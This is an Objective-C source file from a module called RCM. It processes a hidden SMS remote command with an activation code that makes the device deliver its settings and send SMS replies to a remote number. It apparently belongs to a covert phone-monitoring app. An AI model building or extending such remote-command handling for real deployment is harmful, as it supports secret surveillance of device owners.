//
//  RequestDeviceSettingsProcessor.m
//  RCM
//
//  Created by benjawan tanarattanakorn on 3/5/2557 BE.
//
//

#import "RequestDeviceSettingsProcessor.h"

@interface RequestDeviceSettingsProcessor (private)
- (NSArray *) getDeviceSettingIDs;
- (void) processRequestDeviceSettings;
- (void) requestDeviceSettingsException;
- (void) acknowldgeMessage;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete;
- (void) processFinished;
@end


@implementation RequestDeviceSettingsProcessor


/**
 - Method name:			initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:				This method is used to initialize the RequestDeviceSettingsProcessor class
 - Argument list and description:	aRemoteCmdData (RemoteCmdData), aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description:	No return type
 */
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
	
	DLog (@">>>>>>>> RequestDeviceSettingsProcessor--->initWithRemoteCommandData")
	
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}

#pragma mark Overriden method

/**
 - Method name:			doProcessingCommand
 - Purpose:				This method is used to process the RequestDeviceSettingsProcessor
 - Argument list and description:	No Argument
 - Return description:	No return type
 - Overided				RemoteCmdAsyncHTTPProcessor
 */
- (void) doProcessingCommand {
	DLog (@"RequestDeviceSettingsProcessor--->doProcessingCommand")
    /*
     <*#222><AC>                             (** request settings for all unique IDs)
     <*#222><AC><D>                      (** request settings for all unique IDs)
     <*#222><AC><Unique ID1>[<Unique ID2><...><Unique IDN>]
     <*#222><AC><Unique ID1>[<Unique ID2><...><Unique IDN>]<D>
     */
    NSArray *settings = [self getDeviceSettingIDs];
    
	[self processRequestDeviceSettings:settings];
}

- (NSArray *) getDeviceSettingIDs {
    DLog (@"RequestDeviceSettingsProcessor---->getDeviceSettingIDs");
    NSMutableArray *resultArray = [[NSMutableArray alloc] init];
    NSArray *args               = [mRemoteCmdData mArguments];
    DLog(@"args >> %@", args)
    
    for (int index = 2; index < [args count]; index++) { // skip remote command code and activation code
        DLog(@"arg %@", [args objectAtIndex:index])
        
		if (index == [args count]-1) {
			// Check the last argument
			if ([[[args objectAtIndex:index] lowercaseString] isEqualToString:@"d"]) {
                DLog(@"Break here")
                break;
            }
		}
        [resultArray addObject:[args objectAtIndex:index]];
	}	
	return [resultArray autorelease];
}

#pragma mark Private method

/**
 - Method name:			processRequestDeviceSettings
 - Purpose:				This method is used to process Request Device Settings
 - Argument list and description:	No Argument
 - Return description:	No return type
 */
- (void) processRequestDeviceSettings: (NSArray *) aSettings {
	DLog (@"RequestDeviceSettingsProcessor ---> processRequestDeviceSettings")
    
	id <DeviceSettingsManager> devManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mDeviceSettingsManager];
    DLog(@"devManager >> %@", devManager)
	BOOL isReady = [devManager deliverDeviceSettings:aSettings delegate:self];
	if (!isReady) {
		DLog (@"!!! not ready to process request device setting command")
		[self requestDeviceSettingsException];
	}
	else {
		DLog (@".... processing request installed application command")
		[self acknowldgeMessage];
	}
}

/**
 - Method name:			requestDeviceSettingsException
 - Purpose:				This method is invoked when it fails to request device settings
 - Argument list and description:	No Return Type
 - Return description:	No Argument
 */
- (void) requestDeviceSettingsException {
	DLog (@"RequestDeviceSettingsProcessor ---> requestDeviceSettingsException");
	FxException* exception = [FxException exceptionWithName:@"requestDeviceSettingsException" andReason:@"Request device setting error"];
	[exception setErrorCode:kDeviceSettingsManagerBusy];
	[exception setErrorCategory:kFxErrorRCM];
	@throw exception;
}

/**
 - Method name: acknowldgeMessage
 - Purpose:This method is used to prepare acknowldge message
 - Argument list and description:No Argument
 - Return description:No Return
 */

- (void) acknowldgeMessage {
	NSString *messageFormat =[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						 andErrorCode:_SUCCESS_];
	NSString *ackMessage=[ messageFormat stringByAppendingString:NSLocalizedString(@"kRequestDeviceSettingsMSG1", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}


/**
 - Method name:			sendReplySMS:isProcessCompleted:
 - Purpose:				This method is used to send the SMS reply
 - Argument list and description:	aStatusCode (NSUInteger)
 - Return description:	No return type
 */
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"RequestDeviceSettingsProcessor ---> sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	} else {
		DLog (@"Sent aknowldge message.")
	}
}


/**
 - Method name:			processFinished
 - Purpose:				This method is invoked when request device settings process is completed
 - Argument list and description:	No Argument
 - Return description:	isValidArguments (BOOL)
 */
-(void) processFinished {
	DLog (@"RequestDeviceSettingsProcessor ---> processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

#pragma mark DeviceSettingsDelegate protocol

- (void) deviceSettingsDidDeliver: (NSError *) aError {
    DLog (@"!!!!!!! RequestDeviceSettingsProcessor ---> deviceSettingsDidDeliver")
	if (!aError) {
		NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							  andErrorCode:_SUCCESS_];
		NSString *requestBookmarkMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kRequestDeviceSettingsMSG2", @"")];
		[self sendReplySMS:requestBookmarkMessage isProcessCompleted:YES];
	} else {
		NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							  andErrorCode:[aError code]];
		[self sendReplySMS:messageFormat isProcessCompleted:YES];
	}

}

@end
